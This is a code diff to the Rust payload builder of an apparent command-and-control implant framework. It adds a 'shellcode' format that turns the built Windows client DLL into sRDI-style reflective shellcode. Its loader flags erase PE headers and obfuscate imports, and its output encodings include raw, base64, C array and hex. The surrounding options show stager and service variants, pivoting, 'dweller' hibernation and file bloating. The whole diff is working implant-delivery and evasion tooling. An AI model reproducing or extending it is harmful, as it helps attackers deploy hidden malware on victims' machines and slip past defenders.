@@ -40,8 +40,8 @@ struct Cli {
     #[arg(long, default_value_t = false)] debug: bool,
     #[arg(long, default_value_t = 0)] days: i64,
     // ── Feature 1: SNI / ALPN overrides ───────────────────────────────
-    #[arg(long)] sni_override: Option<String>,
-    #[arg(long, value_delimiter = ',')] alpn_protocols: Vec<String>,
+    #[arg(long, visible_alias = "sni")] sni_override: Option<String>,
+    #[arg(long, visible_alias = "alpn", value_delimiter = ',')] alpn_protocols: Vec<String>,
     // ── Feature 3: Hibernation / dweller mode ─────────────────────────
     #[arg(long, default_value_t = false)] hibernation: bool,
     #[arg(long, default_value_t = 1)] batch_size: u32,
@@ -89,6 +89,33 @@ struct Cli {
     /// Omit (default) to disable — leaf nodes and direct-connect agents
     /// do not need this flag.
     #[arg(long)]                           auto_pivot_port:   Option<u16>,
+    // ── Shellcode (sRDI-style reflective DLL → .bin) ──────────────────
+    /// ROR13 hash of a DLL export to call after reflective load.
+    /// Accepts hex (0x…) or decimal. Default 0x10 = "no export call" —
+    /// correct for RCM agents, which start from DllMain.
+    #[arg(long, default_value = "0x10", value_parser = parse_u32_auto)]
+    sc_hash: u32,
+    /// Opaque user-data blob appended to the shellcode (pointer + length
+    /// are passed to the loader stub; reachable from the export call).
+    #[arg(long, default_value = "None")]
+    sc_userdata: String,
+    /// Loader flags (bit0: erase PE headers after load, bit1: obfuscate
+    /// imports). Default 0.
+    #[arg(long, default_value_t = 0)]
+    sc_flags: u32,
+    /// On-disk encoding for the generated shellcode.
+    #[arg(long, value_enum, default_value_t = ScOutput::Bin)]
+    sc_output: ScOutput,
+}
+
+/// Parse a u32 given as decimal or 0x-prefixed hex (for --sc-hash).
+fn parse_u32_auto(s: &str) -> Result<u32, String> {
+    let s = s.trim();
+    if let Some(hex) = s.strip_prefix("0x").or_else(|| s.strip_prefix("0X")) {
+        u32::from_str_radix(hex, 16).map_err(|e| format!("invalid hex u32: {e}"))
+    } else {
+        s.parse::<u32>().map_err(|e| format!("invalid u32: {e}"))
+    }
 }
 
 #[derive(Copy, Clone, PartialEq, Eq, PartialOrd, Ord, ValueEnum, Debug)]
@@ -101,7 +128,10 @@ enum Transport { Tls, TcpPlain, NamedPipe, Http, Https }
 enum ProfileArg { Default, HttpPost, HttpImage }
 
 #[derive(Copy, Clone, PartialEq, Eq, PartialOrd, Ord, ValueEnum, Debug)]
-enum Format { Exe, Dll, Service, Stager }
+enum Format { Exe, Dll, Service, Stager, Shellcode }
+
+#[derive(Copy, Clone, PartialEq, Eq, PartialOrd, Ord, ValueEnum, Debug)]
+enum ScOutput { Bin, B64, C, Hex }
 
 /// Find the cargo binary. Checks (in order):
 ///   1. $CARGO_HOME/bin/cargo          — set in Docker image
@@ -400,6 +430,15 @@ fn main() -> Result<()> {
         "bloat_mb": cli.bloat
     }).to_string();
 
+    // Shellcode conversion wraps a Windows x64 DLL — reject other platforms
+    // up front instead of after a 10-minute compile.
+    if cli.format == Format::Shellcode && cli.platform != Platform::Windows {
+        anyhow::bail!(
+            "--format shellcode converts the Windows x64 client DLL via reflective-loading \
+             and only applies to --platform windows"
+        );
+    }
+
     // ── Compile ───────────────────────────────────────────────────────
     let (target, ext) = match cli.platform {
         Platform::Linux   => ("x86_64-unknown-linux-gnu", ""),
@@ -442,10 +481,10 @@ fn main() -> Result<()> {
     }
 
     let (bin_name, output_ext) = match cli.format {
-        Format::Exe     => ("client", ext),
-        Format::Dll     => ("client_dll", ".dll"),
-        Format::Service => ("client_service", ext),
-        Format::Stager  => ("stager", ext),
+        Format::Exe                  => ("client", ext),
+        Format::Dll | Format::Shellcode => ("client_dll", ".dll"),
+        Format::Service              => ("client_service", ext),
+        Format::Stager               => ("stager", ext),
     };
 
     let format_name = cli.format.to_possible_value().unwrap().get_name().to_string();
@@ -506,6 +545,50 @@ fn main() -> Result<()> {
     fs::create_dir_all("dist")?;
 
     let short_id: String = build_id.chars().take(8).collect();
+
+    if cli.format == Format::Shellcode {
+        // ── Convert the freshly built DLL to reflective shellcode ─────
+        if !src_path.exists() {
+            anyhow::bail!(
+                "Artifact not found at {}.\n\
+                 The build appeared to succeed but the output DLL is missing.",
+                src_path.display()
+            );
+        }
+        let dll_bytes = fs::read(&src_path).context("Failed to read built DLL")?;
+        let opts = rcm::shellcode::ShellcodeOptions {
+            function_hash: cli.sc_hash,
+            user_data: cli.sc_userdata.clone().into_bytes(),
+            flags: cli.sc_flags,
+        };
+        let sc = rcm::shellcode::convert_dll_to_shellcode(&dll_bytes, &opts)
+            .map_err(|e| anyhow::anyhow!("Shellcode conversion failed: {e}"))?;
+
+        let (encoding, sc_ext) = match cli.sc_output {
+            ScOutput::Bin => (rcm::shellcode::ShellcodeEncoding::Raw,    ".bin"),
+            ScOutput::B64 => (rcm::shellcode::ShellcodeEncoding::Base64, ".b64.txt"),
+            ScOutput::C   => (rcm::shellcode::ShellcodeEncoding::CArray, ".c.txt"),
+            ScOutput::Hex => (rcm::shellcode::ShellcodeEncoding::Hex,    ".hex.txt"),
+        };
+        let rendered = rcm::shellcode::encode_shellcode(&sc, encoding, "rcm_sc");
+        let dest_path = PathBuf::from(format!(
+            "dist/{}_{}_{}{}", format_name,
+            cli.platform.to_possible_value().unwrap().get_name(), short_id, sc_ext
+        ));
+        fs::write(&dest_path, &rendered)?;
+
+        println!("\n[+] Build Success!");
+        // NOTE: the API job watcher harvests the artifact path from the
+        // "[+] Binary: " prefix — keep this exact line first.
+        println!("[+] Binary: {}", dest_path.display());
+        println!("[+] Format:   {} ({:?} encoding)", format_name, cli.sc_output);
+        println!("[+] Profile:  {}", final_profile.name);
+        println!("[+] DLL:      {} bytes → shellcode: {} bytes", dll_bytes.len(), sc.len());
+        println!("[i] Layout: 69-byte bootstrap + {}-byte RDI stub + DLL + user data", rcm::shellcode::RDI_STUB_LEN);
+        println!("[i] Export hash: 0x{:08X} (0x10 = DllMain only), flags: {}", opts.function_hash, opts.flags);
+        return Ok(());
+    }
+
     let dest_path = PathBuf::from(format!(
         "dist/{}_{}_{}{}", format_name, cli.platform.to_possible_value().unwrap().get_name(),
         short_id, output_ext
